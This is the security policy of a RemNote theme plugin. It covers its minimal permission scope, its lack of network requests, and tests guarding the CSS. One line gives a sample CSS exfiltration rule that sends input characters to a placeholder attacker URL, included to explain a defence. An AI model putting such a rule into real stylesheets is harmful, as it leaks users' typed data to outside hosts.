# Security

## Reporting a problem

Open a [security advisory](https://github.com/mdeguzis/remnote-sakura-theme/security/advisories/new) rather than a public issue. If you cannot, email mdeguzis@gmail.com.

## What the plugin asks for

One scope: the plugin's own `sakura` powerup, at `Read`. That covers the powerup and any rem tagged with it, and the plugin never creates or applies that powerup, so in practice it can read no rems at all.

It asks for anything only because RemNote gates the event that tells a plugin a setting changed behind holding some scope at `Read` level. With no scope at all, the console shows `attempted to perform 'events.addListener', but no scope has permission level of at least 'Read'` and changing a setting stops updating the theme. The check looks at the level, not at how much the scope covers, so the narrowest scope there is satisfies it.

Up to 1.3.0 the plugin asked for `All` at `Read`, which permits reading every rem in the knowledge base. That was copied from the theme plugins already in the marketplace on the belief that the settings listener needed it. It did not, as [#16](https://github.com/mdeguzis/remnote-sakura-theme/issues/16) pointed out. 1.3.1 drops it.

The theme zip (`SakuraTheme.zip`) has no JavaScript and asks for nothing.

## What it does with it

Nothing. The runtime is `src/widgets/index.tsx`: it registers nine settings, reads them, passes them to `compose()`, and calls `plugin.app.registerCSS`. It never calls a `rem`, `search`, `queue` or `knowledge_base` method.

- No network requests at runtime. Every colour and every piece of artwork is compiled into the bundle, so nothing is fetched while you use it and it works offline.
- No stored data beyond the settings RemNote itself persists.
- `compose()` is a pure function from options to a string, with no I/O.

It reads three things from your machine, and none of them leaves it:

- Your system time zone (`Intl.DateTimeFormat`), to decide which hemisphere's winter brings snow when Season is on Automatic. It is matched against a list in `src/lib/season.ts` and used for nothing else.
- Your browser's user agent, which only appears in the debug report, and only when you open that report yourself.
- The clipboard, written to only when you press copy in the debug report.

The source is small enough to check rather than trust. The plugin is `src/widgets/index.tsx`, `src/lib/compose.ts` and `src/lib/season.ts`, about 650 lines between them.

## Why the CSS itself is safe to run

Custom CSS is not inert, and RemNote warns about this on the Custom CSS page. Two things worth knowing about this theme specifically:

- **No remote `url()` anywhere.** A remote URL in CSS, combined with an attribute selector, is a working exfiltration channel: `input[value^="a"] { background: url(https://attacker/?a) }` leaks content one character per request. Every image here is an embedded `data:` URI, and a test asserts that no non-`data:` URL survives into the built stylesheet.
- **The decorative layers cannot take input.** The branches, scenery and petals are `position: fixed` full-viewport elements. They all carry `pointer-events: none`, and a test asserts that every fixed layer does, so none of them can intercept a click or cover a control.

## Tests that back this up

```
npm test
```

`tests/css.test.mjs` checks that no remote URL reaches the stylesheet, that every fixed decorative layer sets `pointer-events: none`, and that every custom property the CSS reads is actually declared. `tests/contrast.test.mjs` checks WCAG contrast for body text, muted text, panel text and the accent, in every shade and both modes.
